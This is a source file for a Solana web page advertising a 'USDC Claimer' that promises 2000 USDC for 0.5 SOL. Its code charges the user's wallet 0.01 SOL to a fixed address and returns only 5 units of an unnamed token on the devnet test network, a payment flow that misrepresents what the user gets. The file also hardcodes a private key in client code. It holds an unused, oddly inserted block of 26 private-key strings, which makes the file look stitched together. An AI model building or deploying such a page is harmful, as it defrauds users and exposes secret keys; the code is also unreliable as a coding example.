/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3UjzCjj5NtyJvUxfAjJJxpsqirF7SdJ6NtnFMSJzF4gHsHKjYLZXRUhBGsCmoCHAHTZhMcaFcBy3XXCvkGg3xiLH"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4sUvNqH5p3bTwxgX3w9KjUGzyPeVh25jVEEZvNshx5y6Q4q2RNJTC1rHTeJx8o51y9LEyjdQVDqG7hxPf82Hy6AQ",
  "key1": "3vmgbPPDt5cpQznpxYhmzXjqXY1V7ii7xLTzTGcQbtZQS7PquFfZMGSW66i3c351FW7gCH59J1xkHZupUPAiXSic",
  "key2": "4qMu3M7SgF5pbXenDcko5g8Y4JqNJS5D2tHny53U4ngpgr4PGLAofPdcSG8oJXm8KZ9csb3KXqeqsqzDDGBAMBFp",
  "key3": "5HJKuEGwashQ8LqXUNhCQ95fMfCYDzFLdoN4jd3vFgMnqacZyvhPQq14EinRuFKBimWQ3xNS9WTDfLSJPZKJnpWe",
  "key4": "2kjyyCdyuKwGdqxAsjzErBCLmvFJ8xMbfZUwa3Zfq4H2FxpNVD25f8WHV5spaWnUGvCCTcZAQyxoywHSeDvQRby3",
  "key5": "5Z5BUSxVNG62eyyxNChJPvZ3KkWq22y8MrWyHcG2NfEY5m3zfTgih8tDgFDf4EKRZdjgrcF7GFhXhv9y3rCKE1gz",
  "key6": "59vj7J7DmRzh1ihDD5tuSBDpDdxTDo3P63j1bp5uD5hv27kXjebUTjpJNHYnLJJatoNh4VjWpiyCpg5i2kBQ2Yqh",
  "key7": "3JCCdFzpJPBJ5dWRnwqNiwELswcgXdLnhx3PgSJUZb3qZ3xHGTPaU3UM2MEuzz2BnsPaQ5644AwRD9mWX8vkC1hj",
  "key8": "2LqVvWdJfE44oBgoT5k67QPm3r23Lw6xfqo2psCWKgfM2V8EUjY3fkjQ34pdsvkHowm6jY8xtEk154BRfTWHNp4F",
  "key9": "3XeNcVMM1D9gpbEd3QBXTAPYWTzgCCpARAxFe8jM7hF71adZ2xV4jSTwZdpzTq3HZZ7PY58iZwNpomaB9syCHb8A",
  "key10": "2mbCW8iDs7sYju2sTrkdrfnhEWW5znuPzYNZWLKYoCDaGHSntTN4CyrnZJKJpyJQSUVQhxHH3G5FhAjULtHoSRjb",
  "key11": "55yq5PUFrpStmZeSsLUT3U5DgkobDcahXjqEAr6KJpfNTdfVV4PQc9PwGDfv1PEwCSXeZgLTwQ5LqfnpaAZpKVYZ",
  "key12": "3mcZZpNSEyyeENBEdfiGSHFKWYEqpFVMH2QQA4QLsW4Z17H67VSUdDWx9t5o3Frx2d7Px2DSpvsCEWpjfjPBeX1f",
  "key13": "2TfdRkitDK1YApNMSmS57AgLn1ut2oaEtxKtMRNARjcrdDWkBy7P7vXqQ7rXGEssKmcRq2iVxabY7soErHogPbJs",
  "key14": "5ZMXkSXbipL1aqFVsGJbbbG8nhUvgxuRieVCr9Avtnd5fq1MWjmsuwScDLKMSiYq7k3SxfGoFP86Vnp1tLqYVEuS",
  "key15": "4zJgj3356twt3wzkCjFYC3NDnMCqzqdoMuScLoZ6afquKKcGgPWzGyvHBfNqzoSy7UBLf1y4LGUcKcFH2zqE74Yj",
  "key16": "UdqAeC8ta5gDAaMVrqeU6d8mQFTVoCTTt28C364u9aPquHCXcZBgqbNATnDEWcZzsbK9SpbaszBzTFLsGVPgCEo",
  "key17": "5CCmDFrUMHn4emjCv9cPKTCoQpd3qZgx1PcwVEywSFN2aYmDTpQES8zgEwwaJQ7cDhfRM4g6wTPB8hzPhUHb57GC",
  "key18": "66WXvhxs4sMMkm3WiBnZCBZgqp3qxerbFyBZq1irumEEUsuwG4mR9kogZsR6rTRiC6g7XSr71rnCku4GT8b79Q8A",
  "key19": "2HME22A5gUfHRwvzycg27ymSYETLyUFSg5X7NDEvXuMVkCVT6w1fhjnrLbU3CfpLbA432V3ADYeJtjm8cbXNqF9H",
  "key20": "5wagZ6b9Fmq7SzoB5x7LBfqEB2fCeqgvFNjuqmJajAHjz3NUUTMRsPd5mSszKbuA8FM2BcpYv3Wsrs9MifSfuV8Z",
  "key21": "2sBp3xyAwAGsuG2a9YH61Fro1Md9qySciUSHmPMa46N6Gg9sMj3sQy1htrWypFameKuSgmT1wPdKAf8fZbC22xjP",
  "key22": "5e7AjsykGavi4y5uZPhdKHi1MFigHFbCxvaTfafF8FAbVnzEFSmi8Ti9qzBLLxb3mho2nfACktgGH93vn6fxFS4y",
  "key23": "2UTujmiCsSuCHiDfagmJHtSxcGkh8hUNgcePDJZDVE8CtaFWJFmVVU4fueGwNeDNpa9EkSpX6uxd3kvbNxTyartt",
  "key24": "48K9P7ts88xpT93JZNcCJsUaKUFBTX2PhPZuTciqzmqBCirpWtMwYuTAAYzTzxTaLyCWttjJi782ttY7v72wUr6k",
  "key25": "3dNZbzPiRVo945pjcCLaAGGPvUavnYpUWjAsEdNnnty7aw2KsE62zT9en6SMfUKoRV36kz6HkdURzWbkFriS99JY"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
